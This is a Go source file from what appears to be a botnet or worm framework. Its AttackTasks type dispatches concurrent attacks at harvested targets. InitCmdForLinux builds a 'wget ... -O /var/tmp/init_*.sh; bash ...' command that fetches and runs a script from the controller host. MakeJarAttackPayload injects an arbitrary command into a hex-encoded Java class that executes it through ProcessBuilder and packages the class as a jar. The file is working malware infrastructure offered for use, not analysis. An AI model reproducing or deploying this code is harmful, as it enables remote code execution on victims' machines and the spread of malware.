package attack

import (
	"encoding/hex"
	"fmt"
	"github.com/cbot/targets/local"
	"github.com/cbot/targets/source"
	"github.com/cbot/utils/fileutils"
	"github.com/cbot/utils/netutils"
	"os"
	"path/filepath"
	"strings"
	"sync"
)


const (

	JarAttackPayloadBefore = `CAFEBABE0000003400400A001200220700230A000200220700240700250A000400260800270A000500280A000400290A0004002A0A002B002C07002D0A000C002E0A0002002F0800300A001100310700320700330100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C6501000E65786563757465436F6D6D616E64010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B01000D537461636B4D61705461626C6507002507002307002D0100046D61696E010016285B4C6A6176612F6C616E672F537472696E673B295601000A457863657074696F6E7301000A536F7572636546696C6501000C4A61724D61696E2E6A6176610C001300140100176A6176612F6C616E672F537472696E674275696C6465720100186A6176612F6C616E672F50726F636573734275696C6465720100106A6176612F6C616E672F537472696E670C0013001E0100012C0C003400350C003600370C0038003907003A0C003B003C0100136A6176612F6C616E672F457863657074696F6E0C003D003E0C003F003E01`
	JarAttackPayloadAfter  = `0C001700180100074A61724D61696E0100106A6176612F6C616E672F4F626A65637401000573706C6974010027284C6A6176612F6C616E672F537472696E673B295B4C6A6176612F6C616E672F537472696E673B010007636F6D6D616E6401002F285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573734275696C6465723B010005737461727401001528294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000777616974466F7201000328294901000A6765744D65737361676501001428294C6A6176612F6C616E672F537472696E673B010008746F537472696E67002100110012000000000003000100130014000100150000002100010001000000052AB70001B10000000100160000000A00020000000300040004000A0017001800010015000000900003000400000037BB000259B700034CBB00045903BD0005B700064D2C2A1207B60008B60009572CB6000A4E2DB6000B57A700094D2CB6000DB02BB6000EB0000100080029002C000C00020016000000260009000000080008000C0014000E001F00100024001200290016002C0014002D0015003200180019000000130002FF002C000207001A07001B000107001C050009001D001E00020015000000230001000100000007120FB8001057B10000000100160000000A00020000001D0006001F001F000000040001000C00010020000000020021`

	JarMetaFileContent = `Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Build-Jdk: 1.8.0_261
Main-Class: JarMain
`
	)

type AttackTasks struct {

	lock sync.Mutex

	Cfg *Config

	spool *source.SourcePool

	nodeInfo *local.NodeInfo

	attacks map[string]Attack

	syncChan chan int

	attackProcessChan chan *AttackProcess
}

func NewAttackTasks(cfg *Config, nodeInfo *local.NodeInfo, spool *source.SourcePool) *AttackTasks {

	return &AttackTasks{
		lock:              sync.Mutex{},
		Cfg:               cfg,
		spool:             spool,
		nodeInfo:          nodeInfo,
		attacks:           make(map[string]Attack),
		syncChan:          make(chan int, cfg.MaxThreads),
		attackProcessChan: make(chan *AttackProcess, cfg.AttackProcessCapacity),
	}

}

func (at *AttackTasks) AddAttack(attack Attack) {

	at.lock.Lock()
	defer at.lock.Unlock()

	if _, ok := at.attacks[attack.Name()]; !ok {

		//no existed

		at.attacks[attack.Name()] = attack
	}

}

func (at *AttackTasks) RemoveAttack(name string) {

	at.lock.Lock()
	defer at.lock.Unlock()

	delete(at.attacks, name)

}

func (at *AttackTasks) SubAttackProcess() chan *AttackProcess {

	return at.attackProcessChan
}

func (at *AttackTasks) PubAttackProcess(process *AttackProcess) {

	at.attackProcessChan <- process

}

func (at *AttackTasks) run(target source.Target) {

	at.lock.Lock()
	defer at.lock.Unlock()

	for _, attack := range at.attacks {

		if attack.Accept(target) {

			//log.Printf("Try to Attack for target,attack.name:%s",attack.Name())

			//try to run,if too many threads is live than wait some threads exit
			at.PubSyn()
			//ok
			go attack.Run(target)
		}
	}
}

func (at *AttackTasks) PubSyn() {

	at.syncChan <- 1

}

func (at *AttackTasks) PubUnSyn() {

	<-at.syncChan
}

func (at *AttackTasks) Start() {

	targetChan := at.spool.SubTarget("attack_tasks", at.Cfg.SourceCapacity, func(target source.Target) bool {

		for _, attack := range at.attacks {

			if attack.Accept(target) {

				return true
			}
		}
		return false
	})

	go func() {
		for {

			select {

			case target := <-targetChan:

				//log.Printf("Receive a attack target:%s",jsonutils.ToJsonString(target,true))
				at.run(target)

			}
		}
	}()
}

func (at *AttackTasks) DownloadInitUrl(targetIP string, targetPort int, attackType string, fname string) string {

	upc := &netutils.URLPathCrypt{
		TaskId:       at.Cfg.TaskId,
		NodeId:       at.Cfg.NodeId,
		Fname:        fname,
		AttackType:   attackType,
		AttackIP:     at.nodeInfo.IP,
		TargetIP:     targetIP,
		TargetPort:   targetPort,
		DownloadTool: "wget",
	}

	return fmt.Sprintf("http://%s:%d/%s", at.Cfg.SBotHost, at.Cfg.SBotPort, netutils.URLPathCryptToString(upc))

}

func (at *AttackTasks) InitCmdForLinux(initUrl string,attackType string) string {

	return fmt.Sprintf("wget %s -q -O /var/tmp/init_%s.sh;bash /var/tmp/init_%s.sh %s %s", initUrl,attackType,attackType,at.Cfg.NodeId,attackType)
}

func getHexCmdLen(cmd string ) string {

	n := len(cmd)

	if n == 0 {
		return "0000"
	}

	hexStr := fmt.Sprintf("%X",n)

	switch len(hexStr) {

	case 4:
		return hexStr

	case 3:
		return "0"+hexStr

	case 2:
		return "00"+hexStr

	case 1:
		return "000"+hexStr

	default:
		return "0000"
	}

}

func (at *AttackTasks) MakeJarAttackPayload(cmd string) (string,error) {

	cmdHex := strings.ToLower(hex.EncodeToString([]byte(cmd)))
	cmdLenHex := getHexCmdLen(cmd)

	jarPayloadHexString := fmt.Sprintf("%s%s%s%s",JarAttackPayloadBefore,cmdLenHex,cmdHex,JarAttackPayloadAfter)

	jarFilePath := filepath.Join(os.TempDir(),"JarMain.class")

	jdata,err := hex.DecodeString(jarPayloadHexString)
	if err!=nil {
		return "",err
	}

	if err=fileutils.WriteFile(jarFilePath,jdata) ;err!=nil {

		return "",err
	}

	metaFile := filepath.Join(os.TempDir(),"META-INF","MANIFEST.MF")
	os.MkdirAll(filepath.Join(os.TempDir(),"META-INF"),0755)

	if err = fileutils.WriteFile(metaFile,[]byte(JarMetaFileContent));err!=nil {

		return "",err
	}

	jarPackagePath := filepath.Join(os.TempDir(),"JarMain.jar")

	if err = fileutils.ZipFiles(jarPackagePath,os.TempDir(),[]string{jarFilePath,metaFile},true);err!=nil {

		return "",err
	}

	return jarPackagePath,nil
}

func (at *AttackTasks) GetNodeIP()string {

	return at.nodeInfo.IP
}

func (at *AttackTasks) GetNodeId() string {
	return at.Cfg.NodeId
}

func (at *AttackTasks) GetTaskId() string {

	return at.Cfg.TaskId
}

